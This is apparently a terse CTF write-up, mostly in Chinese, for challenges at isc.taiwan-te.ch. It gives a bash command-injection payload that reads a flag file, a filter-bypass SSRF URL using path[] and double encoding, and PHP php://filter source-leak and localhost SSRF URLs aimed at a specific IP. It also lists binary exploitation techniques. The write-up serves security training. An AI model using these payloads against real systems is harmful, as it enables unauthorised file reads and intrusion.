# isc.taiwan-te.ch

## admin-panel
  `my_session` is base64  

## ls
```bash
$(echo > /tmp/$(tail /$(echo fl)$(echo ag)); echo /tmp)
```


## pwns
  - pwntools
  - bof
  - bof2
  - ret2sc
  - gothijack 找到got位置指向shellcode
  - rop
  - ret2plt
  - ret2libc

  ### notes  
  - see github source code 
  - 避免分散發出封包
  - `context.log_level ='debug'`


## jssrf
1. [see source code](http://140.118.126.237:8889/source)
2. 本網頁透過`3000`作為公開端口，並且透過該端口接收api，之後過濾輸入內容之後傳到內部端口`3333`。
3. 過濾器`限制長度`與`../`，前者透過path[]繞過，後者透過兩次編碼繞過
4. 得到flag的emoji，一樣兩次編碼繞過第二個過濾器得出結果
5. [get flag](http://140.118.126.237:8889/?path[]=.%252e/flag?tok%25%36%35n=SUP3R_S3CR3T_T0K3N)

## re-d1v1n6
  1. 讓php報錯之後得知`file_get_contents()`函數使用，
  2. 透過`php://filter` 下載base64內容不完整，採用zlib.deflate
  [下載](http://140.118.126.237:8890/?p=php://filter/zlib.deflate/resource=index.php)
  並且解壓縮得到完整的原始碼，執行後得到
  `flag hint: 9GBz6DJ71S1JbPiHYI45.php; fl4g format: flag{[a-z]{16}}`。
  3. 得到該php的[source code](http://140.118.126.237:8890/?p=9GBz6DJ71S1JbPiHYI45.php)
   與[可執行的網站](http://140.118.126.237:8890/?p=http://127.0.0.1/9GBz6DJ71S1JbPiHYI45.php)
  4. ~~透過[過濾器移除tag](http://140.118.126.237:8890/?p=php://filter/string.strip_tags/resource=http://127.0.0.1/9GBz6DJ71S1JbPiHYI45.php?dir=fl4g_1n_th15_d1rect0ry_ju5t_0p3n_m3)~~
    透過[壓縮](http://140.118.126.237:8890/?p=php://filter/zlib.deflate/resource=http%3A%2F%2F127.0.0.1%2F9GBz6DJ71S1JbPiHYI45.php%3Fdir%3Dfl4g_1n_th15_d1rect0ry_ju5t_0p3n_m3)
    換取空間得到更多的資訊，但此方法不是很穩定可以得到解答
  
  - 參見`re-d1v1n6.py`

